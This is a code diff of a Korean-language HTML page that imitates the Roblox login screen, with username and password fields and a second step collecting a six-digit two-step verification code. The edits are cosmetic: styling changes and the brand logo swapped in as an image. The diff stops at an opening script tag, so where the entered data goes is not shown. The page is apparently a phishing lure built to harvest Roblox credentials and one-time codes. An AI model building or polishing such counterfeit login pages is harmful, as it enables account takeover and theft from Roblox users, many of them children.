@@ -6,43 +6,43 @@
 <title>Roblox</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,'Noto Sans KR',sans-serif;background:#f2f2f7;color:#111;min-height:100vh;display:flex;flex-direction:column;-webkit-font-smoothing:antialiased}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,'Noto Sans KR',sans-serif;background:#f2f2f7;color:#111;min-height:100vh;display:flex;flex-direction:column}
 a{text-decoration:none}
 input{outline:none}
 .header{background:#101010;padding:12px 16px;display:flex;align-items:center;justify-content:space-between;position:fixed;top:0;left:0;right:0;z-index:100}
-.header-left{display:flex;align-items:center;gap:10px}
-.header-logo svg{height:24px;display:block}
+.header-left{display:flex;align-items:center;gap:12px}
+.header-logo img{height:24px;display:block}
 .header-right svg{fill:#fff;width:22px;height:22px}
-.main-content{flex:1;padding:76px 24px 40px;display:flex;flex-direction:column;align-items:center}
+.main-content{flex:1;padding:80px 24px 40px;display:flex;flex-direction:column;align-items:center}
 .logo-section{text-align:center;margin:24px 0 28px}
-.logo-section .logo-svg{width:80px;height:80px;margin-bottom:12px}
-.logo-section h1{font-size:28px;font-weight:800;color:#111;letter-spacing:-0.5px}
+.logo-section .logo-img{width:80px;height:80px;margin-bottom:12px}
+.logo-section h1{font-size:28px;font-weight:800;color:#111}
 .login-card{width:100%;max-width:400px}
 .form-group{margin-bottom:20px}
 .form-group label{display:block;font-size:15px;font-weight:600;color:#111;margin-bottom:6px}
-.form-group input{width:100%;padding:14px 16px;border:1px solid #c8c8cd;border-radius:10px;font-size:16px;background:#fff;color:#111;-webkit-appearance:none}
-.form-group input:focus{border-color:#007aff;box-shadow:0 0 0 2px rgba(0,122,255,0.15)}
+.form-group input{width:100%;padding:14px 16px;border:1px solid #c8c8cd;border-radius:10px;font-size:16px;background:#fff;color:#111}
+.form-group input:focus{border-color:#007aff}
 .form-group input::placeholder{color:#8e8e93}
-.login-btn{width:100%;padding:15px;background:#007aff;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;margin-top:4px;cursor:pointer;-webkit-appearance:none}
+.login-btn{width:100%;padding:15px;background:#007aff;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;margin-top:4px;cursor:pointer}
 .login-btn:active{background:#0056b3}
 .forgot-link{display:block;text-align:center;margin-top:16px;font-size:15px;color:#007aff;font-weight:500}
 .divider-wrap{display:flex;align-items:center;margin:24px 0;color:#8e8e93;font-size:13px}
 .divider-wrap::before,.divider-wrap::after{content:'';flex:1;height:1px;background:#c8c8cd}
 .divider-wrap span{padding:0 16px}
-.device-btn{width:100%;padding:14px;background:#fff;color:#007aff;border:1px solid #c8c8cd;border-radius:12px;font-size:15px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px;-webkit-appearance:none}
+.device-btn{width:100%;padding:14px;background:#fff;color:#007aff;border:1px solid #c8c8cd;border-radius:12px;font-size:15px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px}
 .device-btn:active{background:#f2f2f7}
 .signup-text{text-align:center;margin-top:28px;font-size:15px;color:#555}
 .signup-text a{color:#007aff;font-weight:700}
 .error-msg{color:#d32f2f;font-size:13px;margin-top:12px;display:none;padding:10px 12px;background:#fef0ef;border-radius:10px;text-align:center}
 #step2fa{display:none}
 .fa-header{text-align:center;margin-bottom:28px}
-.fa-header .fa-svg{width:80px;height:80px;margin-bottom:16px}
+.fa-header .fa-img{width:80px;height:80px;margin-bottom:16px}
 .fa-header h2{font-size:22px;font-weight:700;color:#111;margin-bottom:12px}
 .fa-header p{font-size:15px;color:#333;line-height:1.6}
 .fa-header p .fa-email{font-weight:700;color:#111}
 .fa-input-wrap{display:flex;gap:8px;justify-content:center;margin:28px 0}
-.fa-input-wrap input{width:46px;height:54px;text-align:center;font-size:22px;font-weight:700;border:1px solid #c8c8cd;border-radius:10px;background:#fff;color:#111;-webkit-appearance:none}
-.fa-input-wrap input:focus{border-color:#007aff;box-shadow:0 0 0 2px rgba(0,122,255,0.15)}
+.fa-input-wrap input{width:46px;height:54px;text-align:center;font-size:22px;font-weight:700;border:1px solid #c8c8cd;border-radius:10px;background:#fff;color:#111}
+.fa-input-wrap input:focus{border-color:#007aff}
 .fa-resend{text-align:center;font-size:14px;color:#555;margin-top:16px}
 .fa-resend a{color:#007aff;font-weight:500}
 .fa-error{color:#d32f2f;font-size:13px;margin-top:12px;display:none;padding:10px 12px;background:#fef0ef;border-radius:10px;text-align:center}
@@ -51,47 +51,32 @@ input{outline:none}
 .footer-links a{color:#888;font-size:11px}
 .footer-links a:hover{color:#fff}
 .footer-copy{color:#555;font-size:11px}
-@media(max-width:380px){.fa-input-wrap input{width:38px;height:46px;font-size:18px}}
 </style>
 </head>
 <body>
 
 <div class="header">
 <div class="header-left">
-<div class="header-logo">
-<svg viewBox="0 0 100 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-<text x="0" y="20" font-family="Arial, sans-serif" font-size="22" font-weight="900" fill="#fff">R</text>
-<rect x="25" y="2" width="18" height="18" rx="3" transform="rotate(20 25 2)" stroke="#fff" stroke-width="2.8" fill="none"/>
-<text x="47" y="20" font-family="Arial, sans-serif" font-size="22" font-weight="900" fill="#fff">blox</text>
-</svg>
+<a class="header-logo"><img src="roblox-logo.png" alt="Roblox Logo"></a>
 </div>
-</div>
-<div class="header-right">
-<svg viewBox="0 0 24 24" fill="#fff"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
-</div>
+<div class="header-right"><svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg></div>
 </div>
 
 <div class="main-content">
 
 <div id="step1">
 <div class="logo-section">
-<svg class="logo-svg" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
-<rect x="10" y="10" width="100" height="100" rx="8" transform="rotate(20 10 10)" stroke="#222" stroke-width="5" fill="none"/>
-<rect x="28" y="28" width="64" height="64" rx="5" transform="rotate(20 28 28)" fill="#ddd"/>
-</svg>
+<img class="logo-img" src="roblox-logo.png" alt="Roblox Logo">
 <h1>Roblox</h1>
 </div>
 <div class="login-card">
 <form id="loginForm">
-<div class="form-group"><label for="username">사용자 이름</label><input type="text" id="username" placeholder="사용자 이름" required autocomplete="off"></div>
-<div class="form-group"><label for="password">비밀번호</label><input type="password" id="password" placeholder="비밀번호" required autocomplete="off"></div>
+<div class="form-group"><label for="username">사용자 이름</label><input type="text" id="username" placeholder="사용자 이름" required></div>
+<div class="form-group"><label for="password">비밀번호</label><input type="password" id="password" placeholder="비밀번호" required></div>
 <button class="login-btn" type="submit">로그인</button>
 <a href="#" class="forgot-link">비밀번호 또는 사용자 이름을 잊으셨나요?</a>
 <div class="divider-wrap"><span>또는</span></div>
-<button class="device-btn" type="button">
-<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#007aff" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
-다른 기기로 로그인
-</button>
+<button class="device-btn" type="button"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#007aff" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg> 다른 기기로 로그인</button>
 <div class="error-msg" id="errorMsg">사용자 이름 또는 비밀번호가 올바르지 않습니다</div>
 </form>
 <div class="signup-text">계정이 없으신가요? <a href="#">회원가입</a></div>
@@ -100,21 +85,18 @@ input{outline:none}
 
 <div id="step2fa">
 <div class="fa-header">
-<svg class="fa-svg" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
-<rect x="10" y="10" width="100" height="100" rx="8" transform="rotate(20 10 10)" stroke="#222" stroke-width="5" fill="none"/>
-<rect x="28" y="28" width="64" height="64" rx="5" transform="rotate(20 28 28)" fill="#ddd"/>
-</svg>
+<img class="fa-img" src="roblox-logo.png" alt="Roblox Logo">
 <h2>2단계 인증</h2>
 <p>귀하의 이메일 <span class="fa-email" id="faEmailDisplay"></span> 로 전송된 인증 코드를 입력하십시오</p>
 </div>
 <form id="faForm">
 <div class="fa-input-wrap">
-<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="fa-digit" data-index="0" autocomplete="off">
-<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="fa-digit" data-index="1" autocomplete="off">
-<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="fa-digit" data-index="2" autocomplete="off">
-<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="fa-digit" data-index="3" autocomplete="off">
-<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="fa-digit" data-index="4" autocomplete="off">
-<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="fa-digit" data-index="5" autocomplete="off">
+<input type="text" maxlength="1" inputmode="numeric" class="fa-digit" data-index="0">
+<input type="text" maxlength="1" inputmode="numeric" class="fa-digit" data-index="1">
+<input type="text" maxlength="1" inputmode="numeric" class="fa-digit" data-index="2">
+<input type="text" maxlength="1" inputmode="numeric" class="fa-digit" data-index="3">
+<input type="text" maxlength="1" inputmode="numeric" class="fa-digit" data-index="4">
+<input type="text" maxlength="1" inputmode="numeric" class="fa-digit" data-index="5">
 </div>
 <button class="login-btn" type="submit">확인</button>
 <div class="fa-resend">코드를 받지 못하셨나요? <a href="#">다시 보내기</a></div>
@@ -138,7 +120,7 @@ input{outline:none}
 <li><a href="#">설정</a></li>
 <li><a href="#">사이트 맵</a></li>
 </ul>
-<p class="footer-copy">©2026 Roblox Corporation. Roblox, Roblox 로고 및 Powering Imagination은 미국 및 그 외 국가에서 등록 상표 및 미등록 상표입니다.</p>
+<p class="footer-copy">2026 Roblox Corporation Roblox Roblox 로고 및 Powering Imagination은 미국 및 그 외 국가에서 등록 상표 및 미등록 상표입니다</p>
 </div>
 
 <script>
